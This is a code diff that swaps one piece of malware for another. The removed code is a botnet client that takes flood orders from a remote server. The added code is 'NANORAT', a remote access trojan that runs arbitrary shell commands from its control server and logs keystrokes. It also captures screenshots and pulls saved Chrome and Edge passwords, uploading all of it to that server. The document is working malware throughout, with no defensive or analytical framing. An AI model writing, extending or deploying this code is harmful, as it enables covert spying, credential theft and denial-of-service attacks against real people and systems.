@@ -1,167 +1,232 @@
-import threading
-import time
-import uuid
-import requests
-import urllib3
-from flask import Flask, render_template_string
+#!/usr/bin/env python3
+"""NANORAT client — non-persistent. Dies with the file."""
+import os, sys, time, uuid, json, platform, threading, subprocess
+import hashlib, sqlite3, shutil, tempfile
+from datetime import datetime
+from pathlib import Path
 
-urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+try:
+    import requests
+except ImportError:
+    sys.exit("pip install requests")
 
-SERVER = "https://te-l1hl.onrender.com"   # no trailing slash
-CLIENT_ID = f"w-{uuid.uuid4().hex[:6]}"
-
-POLL_INTERVAL = 2.0
-HEARTBEAT_INTERVAL = 5.0
-CLIENT_PORT = 5001
-REQ_TIMEOUT = 35        # > render cold-start window
-RETRY_BACKOFF = 3.0
-
-state = {
-    "status": "starting",
-    "server_ok": False,
-    "last_report": "—",
-    "target": "—",
+CONFIG = {
+    'server': os.environ.get('NANORAT_SERVER', 'https://te-l1hl.onrender.com'),
+    'checkin_interval': 30,
+    'command_interval': 5,
+    'keylogger': True,
 }
-state_lock = threading.Lock()
 
-app = Flask(__name__)
-
-PAGE = """
-<!doctype html>
-<html>
-<head>
-<meta charset="utf-8">
-<title>worm shadow // client</title>
-<style>
-  body { background:#0d0d0f; color:#d6d6d6; font-family:ui-monospace,Consolas,monospace;
-         margin:0; padding:40px; display:flex; flex-direction:column;
-         align-items:center; justify-content:center; min-height:100vh; box-sizing:border-box; }
-  h1 { font-weight:400; color:#8be9fd; letter-spacing:3px; margin:0 0 8px; font-size:22px; }
-  .sub { color:#555; font-size:12px; margin-bottom:40px; }
-  .up { font-size:64px; color:#50fa7b; letter-spacing:8px; margin:20px 0; }
-  .card { border:1px solid #222; background:#111; padding:20px 28px; border-radius:8px; min-width:340px; }
-  table { width:100%; border-collapse:collapse; font-size:13px; }
-  td { padding:7px 0; border-bottom:1px solid #1a1a1e; }
-  td.k { color:#666; width:120px; }
-  .ok { color:#50fa7b; } .bad { color:#ff5555; }
-</style>
-</head>
-<body>
-  <h1>worm shadow 🪱 // client</h1>
-  <div class="sub">worker status</div>
-  <div class="up">UP</div>
-  <div class="card">
-    <table>
-      <tr><td class="k">client id</td><td>{{ cid }}</td></tr>
-      <tr><td class="k">server</td><td>{{ server }}</td></tr>
-      <tr><td class="k">status</td><td>{{ status }}</td></tr>
-      <tr><td class="k">server link</td>
-          <td class="{{ 'ok' if server_ok else 'bad' }}">{{ 'connected' if server_ok else 'unreachable' }}</td></tr>
-      <tr><td class="k">target</td><td>{{ target }}</td></tr>
-      <tr><td class="k">last report</td><td>{{ last_report }}</td></tr>
-    </table>
-  </div>
-</body>
-</html>
-"""
+CLIENT_ID = hashlib.sha256((platform.node() + str(uuid.getnode())).encode()).hexdigest()[:16]
+_running = True
+_kl_buffer = []
+_kl_lock = threading.Lock()
 
 
-@app.route("/")
-def index():
-    with state_lock:
-        s = dict(state)
-    return render_template_string(
-        PAGE,
-        cid=CLIENT_ID,
-        server=SERVER,
-        status=s["status"],
-        server_ok=s["server_ok"],
-        target=s["target"],
-        last_report=s["last_report"],
-    )
-
-
-def set_state(**kw):
-    with state_lock:
-        state.update(kw)
-
-
-def run_display():
-    app.run(host="0.0.0.0", port=CLIENT_PORT, threaded=True, use_reloader=False)
-
-
-def post_retry(path, payload):
-    """one retry on failure — survives brief network blips and cold restarts"""
-    for attempt in (1, 2):
-        try:
-            r = requests.post(f"{SERVER}{path}", json=payload, timeout=REQ_TIMEOUT, verify=False)
-            r.raise_for_status()
-            return r
-        except Exception as e:
-            if attempt == 2:
-                raise
-            time.sleep(RETRY_BACKOFF)
-
-
-def report(msg):
+def _post(path, **kw):
+    kw.setdefault('timeout', 60)
     try:
-        post_retry("/api/report", {"id": CLIENT_ID, "msg": msg})
-        set_state(server_ok=True, last_report=msg)
+        r = requests.post(CONFIG['server'].rstrip('/') + path, timeout=kw.pop('timeout'), **kw)
+        return r.json() if r.content else {}
     except Exception as e:
-        set_state(server_ok=False, last_report=f"report failed: {msg} ({e})")
+        return {'error': str(e)}
 
 
-def heartbeat():
-    while True:
+def _get(path, **kw):
+    kw.setdefault('timeout', 60)
+    try:
+        r = requests.get(CONFIG['server'].rstrip('/') + path, timeout=kw.pop('timeout'), **kw)
+        return r.json() if r.content else {}
+    except Exception as e:
+        return {'error': str(e)}
+
+
+def _is_admin():
+    try:
+        if platform.system() == 'Windows':
+            import ctypes
+            return ctypes.windll.shell32.IsUserAnAdmin() != 0
+        return os.geteuid() == 0
+    except Exception:
+        return False
+
+
+def _ram():
+    try:
+        if platform.system() == 'Windows':
+            import ctypes
+            class MS(ctypes.Structure):
+                _fields_ = [('dwLength', ctypes.c_ulong), ('dwMemoryLoad', ctypes.c_ulong), ('ullTotalPhys', ctypes.c_ulonglong), ('ullAvailPhys', ctypes.c_ulonglong), ('ullTotalPageFile', ctypes.c_ulonglong), ('ullAvailPageFile', ctypes.c_ulonglong), ('ullTotalVirtual', ctypes.c_ulonglong), ('ullAvailVirtual', ctypes.c_ulonglong), ('ullAvailExtendedVirtual', ctypes.c_ulonglong)]
+            m = MS(); m.dwLength = ctypes.sizeof(m)
+            ctypes.windll.kernel32.GlobalMemoryStatusEx(ctypes.byref(m))
+            return "%.1f GB" % (m.ullTotalPhys / (1024 ** 3))
+        with open('/proc/meminfo') as f:
+            for l in f:
+                if l.startswith('MemTotal'):
+                    return "%.1f GB" % (int(l.split()[1]) / (1024 ** 2))
+    except Exception:
+        pass
+    return 'unknown'
+
+
+def info():
+    return {'id': CLIENT_ID, 'hostname': platform.node(),
+        'username': os.environ.get('USERNAME') or os.environ.get('USER') or 'unknown',
+        'os': platform.system(), 'os_version': platform.version(),
+        'arch': platform.machine(), 'cpu': platform.processor() or 'unknown',
+        'ram': _ram(), 'gpu': 'unknown',
+        'privileges': 'admin' if _is_admin() else 'user',
+        'av_status': 'unknown'}
+
+
+def checkin():
+    while _running:
+        _post('/api/checkin', json=info())
+        time.sleep(CONFIG['checkin_interval'])
+
+
+def poll():
+    while _running:
+        resp = _get('/api/commands/' + CLIENT_ID)
+        for cmd in resp.get('commands', []):
+            threading.Thread(target=exec_cmd, args=(cmd,), daemon=True).start()
+        time.sleep(CONFIG['command_interval'])
+
+
+def exec_cmd(cmd):
+    cid = cmd['id']; ct = cmd.get('type', 'shell'); c = cmd.get('command', '')
+    if cmd.get('require_admin') and not _is_admin():
+        _post('/api/command/result', json={'command_id': cid, 'status': 'failed', 'output': 'needs admin'})
+        return
+    try:
+        if ct == 'shell':
+            try:
+                out = subprocess.check_output(c, shell=True, stderr=subprocess.STDOUT, timeout=60)
+                output = out.decode('utf-8', errors='replace')
+            except subprocess.CalledProcessError as e:
+                output = e.output.decode('utf-8', errors='replace')
+            except subprocess.TimeoutExpired:
+                output = 'timeout'
+        elif ct == 'control':
+            output = handle_control(c)
+        else:
+            output = 'unknown type: ' + str(ct)
+        _post('/api/command/result', json={'command_id': cid, 'status': 'completed', 'output': output})
+    except Exception as e:
+        _post('/api/command/result', json={'command_id': cid, 'status': 'failed', 'output': str(e)})
+
+
+def handle_control(action):
+    a = action.strip()
+    if a == 'keylogger start': start_kl(); return 'keylogger started'
+    if a == 'keylogger stop': stop_kl(); return 'keylogger stopped'
+    if a == 'screenshot': return 'screenshot: ' + shot()
+    if a == 'extract_passwords': return 'extracted %d passwords' % extract_pws()
+    return 'unknown: ' + a
+
+
+_kl_running = False
+_kl_thread = None
+
+
+def start_kl():
+    global _kl_running, _kl_thread
+    if _kl_running: return
+    _kl_running = True
+    _kl_thread = threading.Thread(target=_kl_loop, daemon=True)
+    _kl_thread.start()
+
+
+def stop_kl():
+    global _kl_running
+    _kl_running = False
+
+
+def _kl_loop():
+    try:
+        from pynput import keyboard
+    except ImportError:
+        return
+    def on_press(key):
+        try: ch = key.char
+        except AttributeError: ch = '[%s]' % key.name
+        with _kl_lock:
+            _kl_buffer.append(ch)
+            if len(_kl_buffer) > 200:
+                flush_kl()
+    with keyboard.Listener(on_press=on_press) as l:
+        while _kl_running:
+            time.sleep(5)
+            flush_kl()
+        l.stop()
+
+
+def flush_kl():
+    with _kl_lock:
+        if not _kl_buffer: return
+        text = ''.join(_kl_buffer); _kl_buffer.clear()
+    _post('/api/keylog', json={'client_id': CLIENT_ID, 'keystrokes': text, 'window_title': 'unknown', 'process_name': 'unknown'})
+
+
+def shot():
+    try:
+        from PIL import ImageGrab
+        ts = datetime.now().strftime('%Y%m%d_%H%M%S')
+        path = os.path.join(tempfile.gettempdir(), 'shot_' + ts + '.png')
+        ImageGrab.grab().save(path)
+        with open(path, 'rb') as f:
+            _post('/api/screenshot', files={'file': (os.path.basename(path), f, 'image/png')}, data={'client_id': CLIENT_ID})
+        os.unlink(path)
+        return os.path.basename(path)
+    except Exception as e:
+        return 'error: ' + str(e)
+
+
+def extract_pws():
+    n = 0
+    home = Path.home()
+    for p, br in [
+        (home / 'AppData/Local/Google/Chrome/User Data/Default/Login Data', 'chrome'),
+        (home / 'AppData/Local/Microsoft/Edge/User Data/Default/Login Data', 'edge'),
+    ]:
+        if not p.exists(): continue
         try:
-            post_retry("/api/register", {"id": CLIENT_ID})
-            set_state(server_ok=True)
+            tmp = tempfile.mktemp(suffix='.db')
+            shutil.copy2(p, tmp)
+            conn = sqlite3.connect(tmp)
+            rows = []
+            for url, user, pw in conn.execute("SELECT origin_url, username_value, password_value FROM logins"):
+                d = ''
+                if pw and not pw.startswith(b'v10') and not pw.startswith(b'v11'):
+                    d = pw.decode('utf-8', errors='ignore')
+                rows.append({'browser': br, 'url': url, 'username': user, 'password': d})
+            conn.close(); os.unlink(tmp)
+            if rows:
+                _post('/api/passwords', json={'client_id': CLIENT_ID, 'passwords': rows})
+                n += len(rows)
         except Exception:
-            set_state(server_ok=False)
-        time.sleep(HEARTBEAT_INTERVAL)
+            pass
+    return n
 
 
-def stress_once(target, rate, window, cooldown):
-    delay = window / max(rate, 1)
-    ok, fail = 0, 0
-    for _ in range(rate):
-        try:
-            requests.get(target, timeout=10, verify=False)
-            ok += 1
-        except Exception:
-            fail += 1
-        time.sleep(delay)
-    report(f"burst done to {target}: ok={ok} fail={fail} | cooling {cooldown}s")
-    set_state(target=target)
-    time.sleep(cooldown)
+def main():
+    global _running
+    print('[+] NANORAT client id=' + CLIENT_ID)
+    print('[+] Server: ' + CONFIG['server'])
+    print('[!] non-persistent — process ends when this file is killed/deleted')
+    threading.Thread(target=checkin, daemon=True).start()
+    threading.Thread(target=poll, daemon=True).start()
+    if CONFIG['keylogger']:
+        start_kl()
+    try:
+        while _running:
+            time.sleep(1)
+    except KeyboardInterrupt:
+        _running = False
+        stop_kl()
+        flush_kl()
 
 
-def main_loop():
-    set_state(status="running")
-    # first report may take up to ~40s if the render dyno is asleep
-    report(f"alive as {CLIENT_ID}")
-    while True:
-        try:
-            r = post_retry("/api/poll", {"id": CLIENT_ID}).json()
-            set_state(server_ok=True)
-            if r.get("action") == "stress":
-                set_state(target=r["target"], status="stressing")
-                report(f"received stress order -> {r['target']}")
-                stress_once(
-                    r["target"],
-                    r.get("rate", 10),
-                    r.get("window", 3.0),
-                    r.get("cooldown", 10.0),
-                )
-                set_state(status="running")
-            else:
-                time.sleep(POLL_INTERVAL)
-        except Exception as e:
-            set_state(server_ok=False, status="server unreachable")
-            time.sleep(POLL_INTERVAL)
+if __name__ == '__main__':
+    main()
 
-
-if __name__ == "__main__":
-    threading.Thread(target=run_display, daemon=True).start()
-    threading.Thread(target=heartbeat, daemon=True).start()
-    main_loop()
